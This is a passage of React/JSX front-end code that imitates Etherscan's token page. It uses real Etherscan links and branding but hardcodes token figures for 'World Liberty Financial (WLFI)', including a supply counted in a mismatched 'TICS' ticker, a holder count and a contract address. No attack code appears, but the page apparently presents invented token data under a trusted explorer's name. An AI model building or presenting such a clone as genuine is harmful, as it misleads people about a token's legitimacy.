                  className={`w-6 h-6 absolute inset-0 transition-all duration-300 ${mobileMenuOpen ? 'opacity-100 rotate-0' : 'opacity-0 -rotate-90'
                    } `}
                />
              </div>
            </button>

            {/* Navigation */}
            <div className="hidden lg:block relative bg-white">
              <nav className="flex items-center justify-between px-6 py-2 gap-x-3">
                <div className="flex items-center space-x-8">
                  <div className="flex items-center space-x-6">
                    <a
                      href="#"
                      className="text-gray-900 font-medium hover:text-gray-700 text-sm transition-colors duration-200"
                    >
                      Home
                    </a>

                    <div
                      className="relative"
                    >
                      <button
                        onClick={() => handleDropdownClick('Blockchain')}
                        className="flex items-center space-x-1 text-gray-900 text-sm font-medium hover:text-gray-700 transition-colors duration-200"
                      >
                        <span>Blockchain</span>
                        <ChevronDown className={`w-4 h-4 transition-transform duration-200 ${activeDropdown === 'Blockchain' ? 'rotate-180' : ''} `} />
                      </button>
                    </div>

                    <div
                      className="relative"
                    >
                      <button
                        onClick={() => handleDropdownClick('Tokens')}
                        className="flex items-center space-x-1 text-[#0584C3] font-medium text-sm hover:text-blue-700 transition-colors duration-200"
                      >
                        <span>Tokens</span>
                        <ChevronDown className={`w-4 h-4 transition-transform duration-200 ${activeDropdown === 'Tokens' ? 'rotate-180' : ''} `} />
                      </button>
                    </div>

                    <div
                      className="relative"
                    >
                      <button
                        onClick={() => handleDropdownClick('NFTs')}
                        className="flex items-center space-x-1 text-gray-900 text-sm font-medium hover:text-gray-700 transition-colors duration-200"
                      >
                        <span>NFTs</span>
                        <ChevronDown className={`w-4 h-4 transition-transform duration-200 ${activeDropdown === 'NFTs' ? 'rotate-180' : ''} `} />
                      </button>
                    </div>

                    <div
                      className="relative"
                    >
                      <button
                        onClick={() => handleDropdownClick('Resources')}
                        className="flex items-center space-x-1 text-gray-900 text-sm font-medium hover:text-gray-700 transition-colors duration-200"
                      >
                        <span>Resources</span>
                        <ChevronDown className={`w-4 h-4 transition-transform duration-200 ${activeDropdown === 'Resources' ? 'rotate-180' : ''} `} />
                      </button>
                    </div>

                    <div
                      className="relative"
                    >
                      <button
                        onClick={() => handleDropdownClick('Developers')}
                        className="flex items-center space-x-1 text-gray-900 text-sm font-medium hover:text-gray-700 transition-colors duration-200"
                      >
                        <span>Developers</span>
                        <ChevronDown className={`w-4 h-4 transition-transform duration-200 ${activeDropdown === 'Developers' ? 'rotate-180' : ''} `} />
                      </button>
                    </div>

                    <div
                      className="relative"
                    >
                      <button
                        onClick={() => handleDropdownClick('More')}
                        className="flex items-center space-x-1 text-gray-900 text-sm font-medium hover:text-gray-700 transition-colors duration-200"
                      >
                        <span>More</span>
                        <ChevronDown className={`w-4 h-4 transition-transform duration-200 ${activeDropdown === 'More' ? 'rotate-180' : ''} `} />
                      </button>
                    </div>
                  </div>
                </div>
              </nav>

              {/* Dropdown Content */}
              {activeDropdown && (
                <div
                  className={`absolute bg-white shadow-lg border-t-4 border-[#0584C3] z-50 transition-all duration-200 transform ${activeDropdown ? 'opacity-100 translate-y-1.5' : 'opacity-0 -translate-y-2'
                    } `}
                  style={{
                    left: (() => {
                      const dropdownOrder = ['Blockchain', 'Tokens', 'NFTs', 'Resources', 'Developers', 'More'];
                      const index = dropdownOrder.indexOf(activeDropdown);
                      const positions = [60, 150, 250, 340, 430, 530];
                      return `${positions[index]} px`;
                    })(),
                    top: '100%'
                  }}
                  onMouseLeave={handleDropdownLeave}
                >
                  <div className="px-8 py-6 min-w-fit whitespace-nowrap">
                    {activeDropdown === 'Tokens' && (
                      <div className="space-y-4">
                        <div className="cursor-pointer hover:text-[#0584C3] transition-colors duration-200 group">
                          <a href='https://etherscan.io/tokens' className="block">
                            <span className="text-gray-900 font-medium text-sm group-hover:text-[#0584C3]">Top Tokens</span>
                            <span className="text-gray-500 text-xs ml-2">(ERC-20)</span>
                          </a>
                        </div>

                        <div className="cursor-pointer hover:text-[#0584C3] transition-colors duration-200 group">
                          <a href='https://etherscan.io/tokentxns' className="block">
                            <span className="text-gray-900 font-medium text-sm group-hover:text-[#0584C3]">Token Transfers</span>
                            <span className="text-gray-500 text-xs ml-2">(ERC-20)</span>
                          </a>
                        </div>

                        <div className="cursor-pointer hover:text-[#0584C3] transition-colors duration-200 group">
                          <a href='https://etherscan.io/token/0xdac17f958d2ee523a2206206994597c13d831ec7#balances#flow' className="flex items-center">
                            <span className="text-gray-900 font-medium text-sm group-hover:text-[#0584C3]">Token Flow Visualizer</span>
                            <span className="bg-gray-200 text-gray-700 text-xs px-2 py-1 rounded ml-3 font-medium">Beta</span>
                          </a>
                        </div>
                      </div>
                    )}

                    {activeDropdown === 'Blockchain' && (
                      <div className="space-y-4">
                        <div className="cursor-pointer hover:text-[#0584C3] transition-colors duration-200 group">
                          <a href='https://etherscan.io/txs' className="block">
                            <span className="text-gray-900 font-medium text-sm group-hover:text-[#0584C3]">Transactions</span>
                          </a>
                        </div>
                        <div className="cursor-pointer hover:text-[#0584C3] transition-colors duration-200 group">
                          <a href='https://etherscan.io/txsPending' className="block">
                            <span className="text-gray-900 font-medium text-sm group-hover:text-[#0584C3]">Pending Transactions</span>
                          </a>
                        </div>
                        <div className="cursor-pointer hover:text-[#0584C3] transition-colors duration-200 group">
                          <a href='https://etherscan.io/txsBeaconDeposit' className="block">
                            <span className="text-gray-900 font-medium text-sm group-hover:text-[#0584C3]">Beacon Transactions</span>
                          </a>
                        </div>
                        <div className="cursor-pointer hover:text-[#0584C3] transition-colors duration-200 group">
                          <a href='https://etherscan.io/blocks' className="block">
                            <span className="text-gray-900 font-medium text-sm group-hover:text-[#0584C3]">View Blocks</span>
                          </a>
                        </div>
                        <div className="cursor-pointer hover:text-[#0584C3] transition-colors duration-200 group">
                          <a href='https://etherscan.io/txsBlobs' className="block">
                            <span className="text-gray-900 font-medium text-sm group-hover:text-[#0584C3]">View Blobs</span>
                          </a>
                        </div>
                      </div>
                    )}

                    {activeDropdown === 'NFTs' && (
                      <div className="space-y-4">
                        <div className="cursor-pointer hover:text-[#0584C3] transition-colors duration-200 group">
                          <a href='https://etherscan.io/nft-top-contracts' className="block">
                            <span className="text-gray-900 font-medium text-sm group-hover:text-[#0584C3]">Top NFTs</span>
                          </a>
                        </div>
                        <div className="cursor-pointer hover:text-[#0584C3] transition-colors duration-200 group">
                          <a href='https://etherscan.io/nft-top-mints' className="block">
                            <span className="text-gray-900 font-medium text-sm group-hover:text-[#0584C3]">Top Mints</span>
                          </a>
                        </div>
                        <div className="cursor-pointer hover:text-[#0584C3] transition-colors duration-200 group">
                          <a href='https://etherscan.io/nft-trades' className="block">
                            <span className="text-gray-900 font-medium text-sm group-hover:text-[#0584C3]">Latest Trades</span>
                          </a>
                        </div>
                        <div className="cursor-pointer hover:text-[#0584C3] transition-colors duration-200 group">
                          <a href='https://etherscan.io/nft-transfers' className="block">
                            <span className="text-gray-900 font-medium text-sm group-hover:text-[#0584C3]">Latest Transfers</span>
                          </a>
                        </div>
                        <div className="cursor-pointer hover:text-[#0584C3] transition-colors duration-200 group">
                          <a href='https://etherscan.io/nft-latest-mints' className="block">
                            <span className="text-gray-900 font-medium text-sm group-hover:text-[#0584C3]">Latest Mints</span>
                          </a>
                        </div>
                      </div>
                    )}

                    {activeDropdown === 'Resources' && (
                      <div className="space-y-4">
                        <div className="cursor-pointer hover:text-[#0584C3] transition-colors duration-200 group">
                          <a href='https://etherscan.io/charts' className="block">
                            <span className="text-gray-900 font-medium text-sm group-hover:text-[#0584C3]">Charts & Stats</span>
                          </a>
                        </div>
                        <div className="cursor-pointer hover:text-[#0584C3] transition-colors duration-200 group">
                          <a href='https://etherscan.io/topstat' className="block">
                            <span className="text-gray-900 font-medium text-sm group-hover:text-[#0584C3]">Top Statistics</span>
                          </a>
                        </div>
                        <div className="cursor-pointer hover:text-[#0584C3] transition-colors duration-200 group">
                          <a href='https://etherscan.io/leaderboard' className="block">
                            <span className="text-gray-900 font-medium text-sm group-hover:text-[#0584C3]">Leaderboard</span>
                          </a>
                        </div>
                        <div className="cursor-pointer hover:text-[#0584C3] transition-colors duration-200 group">
                          <a href='https://etherscan.io/directory' className="block">
                            <span className="text-gray-900 font-medium text-sm group-hover:text-[#0584C3]">Directory</span>
                          </a>
                        </div>
                        <div className="cursor-pointer hover:text-[#0584C3] transition-colors duration-200 group">
                          <a href='https://info.etherscan.com/newsletters/' className="block">
                            <span className="text-gray-900 font-medium text-sm group-hover:text-[#0584C3]">Newsletter</span>
                          </a>
                        </div>
                      </div>
                    )}

                    {activeDropdown === 'Developers' && (
                      <div className="space-y-4">
                        <div className="cursor-pointer hover:text-[#0584C3] transition-colors duration-200 group">
                          <a href='https://etherscan.io/apis' className="block">
                            <span className="text-gray-900 font-medium text-sm group-hover:text-[#0584C3]">API Plans</span>
                          </a>
                        </div>
                        <div className="cursor-pointer hover:text-[#0584C3] transition-colors duration-200 group">
                          <a href='https://docs.etherscan.io/' className="block">
                            <span className="text-gray-900 font-medium text-sm group-hover:text-[#0584C3]">API Documentation</span>
                          </a>
                        </div>
                        <div className="cursor-pointer hover:text-[#0584C3] transition-colors duration-200 group">
                          <a href='https://etherscan.io/verifyContract' className="block">
                            <span className="text-gray-900 font-medium text-sm group-hover:text-[#0584C3]">Verify Contracts</span>
                          </a>
                        </div>
                      </div>
                    )}

                    {activeDropdown === 'More' && (
                      <div className="space-y-4">
                        <div className="cursor-pointer hover:text-[#0584C3] transition-colors duration-200 group">
                          <a href='https://etherscan.io/tokenapprovalchecker' className="block">
                            <span className="text-gray-900 font-medium text-sm group-hover:text-[#0584C3]">Token Approvals</span>
                          </a>
                        </div>
                        <div className="cursor-pointer hover:text-[#0584C3] transition-colors duration-200 group">
                          <a href='https://etherscan.io/verifiedSignatures' className="block">
                            <span className="text-gray-900 font-medium text-sm group-hover:text-[#0584C3]">Verified Signatures</span>
                          </a>
                        </div>
                        <div className="cursor-pointer hover:text-[#0584C3] transition-colors duration-200 group">
                          <a href='https://etherscan.io/gastracker' className="block">
                            <span className="text-gray-900 font-medium text-sm group-hover:text-[#0584C3]">Gas Tracker</span>
                          </a>
                        </div>
                        <div className="cursor-pointer hover:text-[#0584C3] transition-colors duration-200 group">
                          <a href='https://etherscan.io/nodetracker' className="block">
                            <span className="text-gray-900 font-medium text-sm group-hover:text-[#0584C3]">Node Tracker</span>
                          </a>
                        </div>
                      </div>
                    )}
                  </div>
                </div>
              )}
            </div>
          </div>
          {/* Mobile Menu */}
          {mobileMenuOpen && (
            <div className={`lg:hidden overflow-hidden transition-all duration-300 ease-in-out ${mobileMenuOpen ? 'max-h-screen opacity-100' : 'max-h-0 opacity-0'
              } `}>
              <div className="pb-4">
                <div className="pt-4 space-y-1">
                  <a
                    href="#"
                    className="block px-3 py-2 text-gray-900 font-medium hover:text-gray-700 hover:bg-gray-50 rounded-md"
                  >
                    Home
                  </a>

                  {/* Mobile Dropdowns */}
                  {['Blockchain', 'Tokens', 'NFTs', 'Resources', 'Developers', 'More'].map((item) => (
                    <div key={item}>
                      <button
                        onClick={() => handleMobileDropdownClick(item)}
                        className={`w-full flex items-center justify-between px-3 py-2 text-left font-medium hover: bg-gray-50 rounded-md ${item === 'Tokens' ? 'text-[#0584C3]' : 'text-gray-900'
                          } `}
                      >
                        <span>{item}</span>
                        <ChevronDown className={`w-4 h-4 transition-transform duration-200 ${activeDropdown === item ? 'rotate-180' : ''
                          } `} />
                      </button>

                      {activeDropdown === item && (
                        <div className="ml-4 mt-2 space-y-2">
                          {item === 'Tokens' && (
                            <>
                              <a href="https://etherscan.io/tokens" className="block px-3 py-2 text-sm text-gray-700 hover:text-[#0584C3] hover:bg-gray-50 rounded-md">
                                Top Tokens <span className="text-gray-500">(ERC-20)</span>
                              </a>
                              <a href="https://etherscan.io/tokentxns" className="block px-3 py-2 text-sm text-gray-700 hover:text-[#0584C3] hover:bg-gray-50 rounded-md">
                                Token Transfers <span className="text-gray-500">(ERC-20)</span>
                              </a>
                              <a href="https://etherscan.io/token/0xdac17f958d2ee523a2206206994597c13d831ec7#balances#flow" className="block px-3 py-2 text-sm text-gray-700 hover:text-[#0584C3] hover:bg-gray-50 rounded-md">
                                Token Flow Visualizer <span className="bg-gray-200 text-gray-700 text-xs px-2 py-1 rounded ml-2">Beta</span>
                              </a>
                            </>
                          )}

                          {item === 'Blockchain' && (
                            <>
                              <a href="https://etherscan.io/txs" className="block px-3 py-2 text-sm text-gray-700 hover:text-[#0584C3] hover:bg-gray-50 rounded-md">Transactions</a>
                              <a href="https://etherscan.io/txsPending" className="block px-3 py-2 text-sm text-gray-700 hover:text-[#0584C3] hover:bg-gray-50 rounded-md">Pending Transactions</a>
                              <a href="https://etherscan.io/txsBeaconDeposit" className="block px-3 py-2 text-sm text-gray-700 hover:text-[#0584C3] hover:bg-gray-50 rounded-md">Beacon Transactions</a>
                              <a href="https://etherscan.io/blocks" className="block px-3 py-2 text-sm text-gray-700 hover:text-[#0584C3] hover:bg-gray-50 rounded-md">View Blocks</a>
                              <a href="https://etherscan.io/txsBlobs" className="block px-3 py-2 text-sm text-gray-700 hover:text-[#0584C3] hover:bg-gray-50 rounded-md">View Blobs</a>
                            </>
                          )}

                          {item === 'NFTs' && (
                            <>
                              <a href="https://etherscan.io/nft-top-contracts" className="block px-3 py-2 text-sm text-gray-700 hover:text-[#0584C3] hover:bg-gray-50 rounded-md">Top NFTs</a>
                              <a href="https://etherscan.io/nft-top-mints" className="block px-3 py-2 text-sm text-gray-700 hover:text-[#0584C3] hover:bg-gray-50 rounded-md">Top Mints</a>
                              <a href="https://etherscan.io/nft-trades" className="block px-3 py-2 text-sm text-gray-700 hover:text-[#0584C3] hover:bg-gray-50 rounded-md">Latest Trades</a>
                              <a href="https://etherscan.io/nft-transfers" className="block px-3 py-2 text-sm text-gray-700 hover:text-[#0584C3] hover:bg-gray-50 rounded-md">Latest Transfers</a>
                              <a href="https://etherscan.io/nft-latest-mints" className="block px-3 py-2 text-sm text-gray-700 hover:text-[#0584C3] hover:bg-gray-50 rounded-md">Latest Mints</a>
                            </>
                          )}

                          {item === 'Resources' && (
                            <>
                              <a href="https://etherscan.io/charts" className="block px-3 py-2 text-sm text-gray-700 hover:text-[#0584C3] hover:bg-gray-50 rounded-md">Charts & Stats</a>
                              <a href="https://etherscan.io/topstat" className="block px-3 py-2 text-sm text-gray-700 hover:text-[#0584C3] hover:bg-gray-50 rounded-md">Top Statistics</a>
                              <a href="https://etherscan.io/leaderboard" className="block px-3 py-2 text-sm text-gray-700 hover:text-[#0584C3] hover:bg-gray-50 rounded-md">Leaderboard</a>
                              <a href="https://etherscan.io/directory" className="block px-3 py-2 text-sm text-gray-700 hover:text-[#0584C3] hover:bg-gray-50 rounded-md">Directory</a>
                              <a href="https://info.etherscan.com/newsletters/" className="block px-3 py-2 text-sm text-gray-700 hover:text-[#0584C3] hover:bg-gray-50 rounded-md">Newsletter</a>
                            </>
                          )}

                          {item === 'Developers' && (
                            <>
                              <a href="https://etherscan.io/apis" className="block px-3 py-2 text-sm text-gray-700 hover:text-[#0584C3] hover:bg-gray-50 rounded-md">API Plans</a>
                              <a href="https://docs.etherscan.io/" className="block px-3 py-2 text-sm text-gray-700 hover:text-[#0584C3] hover:bg-gray-50 rounded-md">API Documentation</a>
                              <a href="https://etherscan.io/verifyContract" className="block px-3 py-2 text-sm text-gray-700 hover:text-[#0584C3] hover:bg-gray-50 rounded-md">Verify Contracts</a>
                            </>
                          )}

                          {item === 'More' && (
                            <>
                              <a href="https://etherscan.io/tokenapprovalchecker" className="block px-3 py-2 text-sm text-gray-700 hover:text-[#0584C3] hover:bg-gray-50 rounded-md">Token Approvals</a>
                              <a href="https://etherscan.io/verifiedSignatures" className="block px-3 py-2 text-sm text-gray-700 hover:text-[#0584C3] hover:bg-gray-50 rounded-md">Verified Signatures</a>
                              <a href="https://etherscan.io/gastracker" className="block px-3 py-2 text-sm text-gray-700 hover:text-[#0584C3] hover:bg-gray-50 rounded-md">Gas Tracker</a>
                              <a href="https://etherscan.io/nodetracker" className="block px-3 py-2 text-sm text-gray-700 hover:text-[#0584C3] hover:bg-gray-50 rounded-md">Node Tracker</a>
                            </>
                          )}
                        </div>
                      )}
                    </div>
                  ))}
                </div>
              </div>
            </div>

          )}
        </div>
      </header>

      <div className='bg-[#FAF7FD] pb-12'>
        {/* Token Header */}
        <div className="max-w-[86rem] mx-auto px-4 py-6 border-b">
          <div className="flex flex-col md:flex-row gap-y-3 md:items-center md:justify-between">
            <div className="flex items-center gap-x-2">
              <div className="w-8 h-8 bg-gray-200 rounded-full flex items-center justify-center">
                <img src={ethereumLogoLight} alt="" />
              </div>
              <div>
                <h1 className="font-medium flex items-center">
                  <div className='text-gray-800'>
                    <span className='text-xl font-semibold'>Token </span> World Liberty Financial <span className='text-[#6C757D]'>(WLFI)</span>
                  </div>
                  <Info className="w-4 h-4 text-gray-400 ml-2" />
                </h1>
              </div>
            </div>

            <div ref={containerRef} className="flex space-x-2 relative">
              {blueTabs.map((tab) => (
                <button
                  key={tab.id}
                  onClick={(e) => handleTabClick(tab.id, e)}
                  className={`
              px-2 py-1.5 bg-[#0584C3] text-xs text-white rounded-md flex items-center
              ${activeTab === tab.id
                      ? 'bg-[#2e82ad]'
                      : 'bg-[#0584C3] hover:bg-[#2e82ad]'
                    }
            `}
                >
                  {tab.label}
                  <ChevronDown

                    className={`transition-transform w-4 h-4 ml-1 ${activeBlueTab === tab.id ? 'rotate-180' : ''}`}
                  />
                </button>
              ))}
              {activeBlueTab && (
                <>
                  <div
                    className="md:hidden top-10 bg-white left-0 rounded-xl shadow-lg border text-xs border-gray-200 absolute z-10"
                  >
                    <div className="absolute top-4 right-4 text-xs text-gray-500">
                      Sponsored
                    </div>
                    {sponsoredContent[activeBlueTab]?.map((ad, index) => (
                      <div
                        key={ad.id}
                        className={`p-3 relative ${index !== sponsoredContent[activeBlueTab].length - 1 ? 'border-b border-gray-100' : ''}`}
                      >
                        {/* Sponsored Label */}


                        <div className="flex items-start gap-4">
                          {/* Logo */}
                          <div className="flex-shrink-0 w-6 h-6 text-lg bg-gray-100 rounded-lg flex items-center justify-center">
                            <img src={ad.logo} className='w-full' alt="" />
                          </div>

                          {/* Content */}
                          <div className="flex-1">
                            <h3 className="text-sm font-bold text-gray-900 mb-2">
                              {ad.title}
                            </h3>

                            <p className="text-blue-600 font-medium mb-3">
                              {ad.subtitle}
                              {ad.buttonText && (
                                <a className="px-2 py-1 ml-1 bg-blue-100 text-blue-600 rounded-full text-[0.6rem] font-medium hover:bg-blue-200 transition-colors">
                                  {ad.buttonText}
                                </a>
                              )}
                            </p>

                            <p className="text-gray-700 leading-relaxed">
                              {ad.description}
                            </p>
                          </div>
                        </div>
                      </div>
                    ))}
                  </div>
                  <div
                    className="hidden md:block w-80 top-10 bg-white rounded-xl shadow-lg border text-xs border-gray-200 absolute z-10"
                    style={{ left: `${dropdownPosition}px` }}
                  >
                    <div className="absolute top-4 right-4 text-xs text-gray-500">
                      Sponsored
                    </div>
                    {sponsoredContent[activeBlueTab]?.map((ad, index) => (
                      <div
                        key={ad.id}
                        className={`p-3 relative ${index !== sponsoredContent[activeBlueTab].length - 1 ? 'border-b border-gray-100' : ''}`}
                      >
                        {/* Sponsored Label */}


                        <div className="flex items-start gap-4">
                          {/* Logo */}
                          <div className="flex-shrink-0 w-6 h-6 text-lg bg-gray-100 rounded-lg flex items-center justify-center">
                            <img src={ad.logo} className='w-full' alt="" />
                          </div>

                          {/* Content */}
                          <div className="flex-1">
                            <h3 className="text-sm font-bold text-gray-900 mb-2">
                              {ad.title}
                            </h3>

                            <p className="text-blue-600 font-medium mb-3">
                              {ad.subtitle}
                              {ad.buttonText && (
                                <a className="px-2 py-1 ml-1 bg-blue-100 text-blue-600 rounded-full text-[0.6rem] font-medium hover:bg-blue-200 transition-colors">
                                  {ad.buttonText}
                                </a>
                              )}
                            </p>

                            <p className="text-gray-700 leading-relaxed">
                              {ad.description}
                            </p>
                          </div>
                        </div>
                      </div>
                    ))}
                  </div>
                </>
              )}
            </div>
          </div>
        </div>

        {/* Feature Tip */}
        <div className="mt-4">
          <div className="max-w-[84rem] mx-auto">
            <p className="hidden md:flex ml-5 xl:ml-0 text-[0.9rem] text-[#6C757D] items-center gap-x-1.5">
              <strong className='text-[#6C757D] flex items-center gap-x-1.5'>Feature Tip: </strong> Add private address tag to any address under <a href="https://xuv.etherscan.com/d3d3/ZGVsaXZlcnk/Y3Cs=.php?YmFubmVyaWQ=8911&em9uZWlk=6&sig=f7cc9fd683254060281bb299c36aae6998946e4b0ddced5f1c09fac1ed47c4e0&oadest=https%3A%2F%2Fa1.adform.net%2FC%2F%3Fbn%3D81692528%3Bgdpr%3D%24%7Bgdpr%7D%3Bgdpr_consent%3D%24%7Bgdpr_consent_50%7D" className="text-[#0584C3] font-bold">My Name Tag !</a>
            </p>
          </div>
        </div>

        {/* Main Content */}
        <div className="max-w-[87rem] mx-auto px-4 py-6">
          <div className="flex justify-between mb-6">
            <div className="border px-3 py-1 rounded-full text-xs bg-white border-gray-300">
              ERC-20
            </div>
            <div className="flex items-center space-x-2 relative">
              <a href='https://docs.etherscan.io/etherscan-v2/api-endpoints/tokens' className="bg-white hover:bg-gray-100 border border-gray-300 rounded-lg px-1.5 py-1 flex items-center space-x-1">
                <RiCodeSSlashFill className='' />
                <span className="text-xs">API</span>
              </a>

              <div onClick={() => setIsMenuOpen(!isMenuOpen)} className="bg-white cursor-pointer hover:bg-gray-100 border border-gray-300 rounded-lg pl-1.5 py-[0.06rem] flex items-center">
                <FaTasks className="text-xs" />
                <ChevronDown className="scale-75" />
              </div>
              {isMenuOpen && (
                <div className="bg-white absolute top-8 right-0 w-80 rounded-lg shadow-lg border border-gray-200 p-1">
                  {menuItems.map((item, index) => {
                    const IconComponent = item.icon;
                    return (
                      <a
                        key={item.id}
                        target='_blank'
                        href={item.href}
                        className={`w-full flex items-center space-x-3 p-3 hover: bg-gray-50 transition-colors text-left rounded-md ${index < menuItems.length - 1 ? 'border-b border-gray-100' : ''
                          } `}
                      >
                        <IconComponent className="w-3 h-3 text-gray-600" />
                        <span className="text-gray-800 font-medium text-xs">{item.label}</span>
                      </a>
                    );
                  })}
                </div>
              )}
            </div>
          </div>

          <div className="grid grid-cols-1 lg:grid-cols-3 gap-6 gap-x-3 mb-8">
            {/* Overview */}
            <div className="bg-white rounded-lg border p-6 px-4 shadow-md">
              <h3 className="font-semibold mb-4 text-gray-800">Overview</h3>

              <div className="space-y-4">
                <div className='space-y-1.5'>
                  <p className="text-xs text-gray-500 uppercase tracking-wide">MAX TOTAL SUPPLY</p>
                  <p className="text-sm">60,999,999,000 TICS</p>
                </div>

                <div className='space-y-1.5'>
                  <p className="text-xs text-gray-500 uppercase tracking-wide">HOLDERS</p>
                  <p className="text-sm">90,500</p>
                </div>
              </div>
            </div>

            {/* Market */}
            <div className="bg-white rounded-lg border p-6 px-4 shadow-md">
              <h3 className="font-semibold mb-4 text-gray-800">Market</h3>

              <div className="space-y-4">
                <div>
                  <p className="text-xs text-gray-500 uppercase tracking-wide flex items-center">
                    ONCHAIN MARKET CAP
                    <Info className="w-4 h-4 text-gray-400 ml-2" />
                  </p>
                  <p className="text-xs font-medium">-</p>
                </div>

                <div>
                  <p className="text-xs text-gray-500 uppercase tracking-wide">CIRCULATING SUPPLY MARKET CAP</p>
                  <p className="text-xs font-medium">-</p>
                </div>
              </div>
            </div>

            {/* Other Info */}
            <div className="bg-white rounded-lg border p-6 px-4 shadow-md">
              <h3 className="font-semibold mb-4 text-gray-800">Other Info</h3>

              <div className="space-y-4">
                <div className='space-y-1.5'>
                  <p className="text-xs text-gray-500 uppercase tracking-wide">TOKEN CONTRACT (WITH 18 DECIMALS)</p>
                  <div className="flex items-center">
                    <FileText className='scale-75 text-gray-400' />
                    <a href="https://etherscan.io/address/0xda5e1988097297dcdc1f90d4dfe7909e847cbef6" className="text-[#0584C3] sm:hidden lg:block xl:hidden hover:underline text-sm font-mono">
                      {shortenEthAddress("0xda5e1988097297dcdc1f90d4dfe7909e847cbef6")}
                    </a>
                    <a href="https://etherscan.io/address/0xda5e1988097297dcdc1f90d4dfe7909e847cbef6" className="text-[#0584C3] hidden sm:block lg:hidden xl:block hover:underline text-sm font-mono">
                      0xda5e1988097297dcdc1f90d4dfe7909e847cbef6
                    </a>
                    <Copy className="w-4 h-4 text-gray-400 ml-2 cursor-pointer hover:text-gray-600" />
                  </div>
                </div>
              </div>

              {/* Advertisement */}
              <div className="mt-4 bg-black rounded-lg p-6 py-3 text-center">
                <div className="text-yellow-400 text-xl font-bold mb-2">INSTANT</div>
                <div className="text-white text-xl font-bold">WITHDRAWALS</div>
                <div className="text-xs text-gray-400 mt-2">Ad</div>
              </div>
            </div>
          </div>

          {/* Tabs */}
          <div className="space-y-3">
            <div className="">
              <div className="flex items-center justify-between">
                <nav className="flex space-x-2">
                  {['Contract'].map((tab) => (
                    <button
                      key={tab}
                      onClick={() => setActiveTab(tab)}
                      className={`py-2 px-2.5 font-medium text-xs relative rounded-lg transition-colors bg-[#0584C3] text-white shadow-sm`}
                    >
                      {tab === 'Cards' ? (
                        <span className="flex items-center gap-2">
                          Cards
                          <span className="bg-white text-[#00A186] text-[0.6rem] px-1 rounded-full font-extrabold">
                            New
                          </span>
                        </span>
                      ) : (
                        tab
                      )}
                      {tab === 'Contract' && (
                        <span className="absolute -top-1 -right-1 bg-[#00A186] rounded-full p-0.5">
                          <FaCheck className="text-white text-[0.6rem]" />
                        </span>
                      )}
                    </button>
                  ))}
                </nav>

                <button className="py-2 px-2.5 text-xs relative rounded-lg transition-colors bg-[#DEE2E6] text-black font-semibold hover:bg-gray-100 border border-gray-200">
                  <Search className="w-[1rem] h-[1rem] text-gray-600" />
                </button>
              </div>
            </div>

            <div className="border border-[#E9ECEF] bg-white shadow-lg rounded-xl flex flex-col pt-3 pb-8">
              {/* Header Tabs */}
              <div className="flex items-center justify-between px-6 py-3">
                <div className="flex space-x-2">
                  {['Write Contract', 'Read Contract', 'Code'].map((tab) => (
                    <button
                      key={tab}
                      onClick={() => setActiveTab(tab)}
                      className={`py-1.5 px-2.5 text-xs font-medium rounded-lg transition-colors ${activeTab === tab
                        ? 'bg-[#0584C3] text-white shadow-sm'
                        : 'bg-[#DEE2E6] text-gray-700 font-semibold hover:bg-gray-200'
                        } `}
                    >
                      {tab}
                    </button>
                  ))}
                </div>

                {activeTab == "Code" && <div className="lg:flex hidden items-center space-x-">
                  <button className="p-2 text-[#6C757D] hover:text-gray-600">
                    <div className="w-3.5 h-3.5 border-2 border-current rounded-full flex items-center justify-center">
                      <span className="text-[0.6rem] font-bold">?</span>
                    </div>
                  </button>
                  <div className="flex border rounded-md">
                    <input
                      type="text"
                      placeholder="Search Source Code"
                      className="text-xs w-48 placeholder-[#6C757D] focus:outline-none rounded-l-md pl-4 focus:ring-2 focus:ring-[#0584C3] focus:border-transparent"
                    />
                    <div className="flex items-center">
                      <div className='border-l border-gray-300 p-0.5'>
                        <ChevronDown className="text-[#212529] scale-75 " />
                      </div>
                      <div className='border-l border-gray-300 p-0.5'>
                        <ChevronUp className="text-[#212529] scale-75" />
                      </div>
                    </div>
                  </div>
                </div>}
              </div>
              <div className="px-6">
                {renderTabContent()}
              </div>
            </div>
            <div className='flex items-center md:items-end text-xs space-x-1 text-[#6D767E]'>
              <span><HiOutlineLightBulb className='text-5xl md:text-3xl xl:text-lg' /></span>
              <p>A token is a representation of an on-chain or off-chain asset. The token page shows information such as price, total supply, holders, transfers and social links. Learn more about this page in our <a href='https://info.etherscan.com/understanding-token-page/' className='text-[#0584C3]'>Knowledge Base</a>.</p>
            </div>
          </div>
        </div>
      </div>
      {/* Footer */}
      <footer className="bg-gray-100 pt-8 pb-2">
        <div className="max-w-[87rem] mx-auto px-4">
          {/* Top Row: Socials and Back to Top */}
          <div className="flex justify-between items-center mb-6">
            <div className="flex space-x-2">
              <a href='https://twitter.com/etherscan' className="w-9 h-9 rounded-full bg-[#e9ecef] flex items-center justify-center hover:bg-[#e9ecef]">
                {/* X (Twitter) icon */}
                <FaXTwitter className="text-sm text-[#0a1929]" />
              </a>
              <a href='https://medium.com/etherscan-blog' className="w-9 h-9 rounded-full bg-[#e9ecef] flex items-center justify-center hover:bg-[#e9ecef]">
                {/* Medium icon */}
                <FaMedium className="text-sm text-[#0a1929]" />
              </a>
              <a href='https://www.facebook.com/etherscan/' className="w-9 h-9 rounded-full bg-[#e9ecef] flex items-center justify-center hover:bg-[#e9ecef]">
                {/* Facebook icon */}
                <FaFacebook className="text-sm text-[#0a1929]" />
              </a>
              <a href='https://www.reddit.com/r/etherscan/' className="w-9 h-9 rounded-full bg-[#e9ecef] flex items-center justify-center hover:bg-[#e9ecef]">
                {/* Reddit icon */}
                <FaRedditAlien className="text-sm text-[#0a1929]" />
              </a>
            </div>
            <a href="#top" className="text-black flex items-center text-xs md:text-sm">
              <LuArrowUpToLine className="" />
              Back to Top
            </a>
          </div>
          <hr className="mb-8" />
          {/* Main Footer Content */}
          <div className="flex flex-col lg:flex-row lg:justify-between lg:items-start mb-8 w-full">
            {/* Left: Powered by Ethereum */}
            <div className="lg:w-2/5 w-full flex flex-col items-start mb-8 lg:mb-0">
              <div className="flex items-center mb-4">
                <img src={ethereumLogo} alt="Ethereum Logo" width={20} height={20} />
                <span className="ml-3 text-lg text-gray-800">Powered by Ethereum</span>
              </div>
              <div className="text-gray-700 mb-6 text-xs max-w-xl">
                Etherscan is a Block Explorer and Analytics Platform for Ethereum, a decentralized smart contracts platform.
              </div>
              <img src={mapImg} alt="World Map" className="opacity-80 w-[300px] max-w-full" />
            </div>
            {/* Columns */}
            <div className="flex-1 grid grid-cols-1 md:grid-cols-3 gap-8 w-full">
              {/* Company */}
              <div>
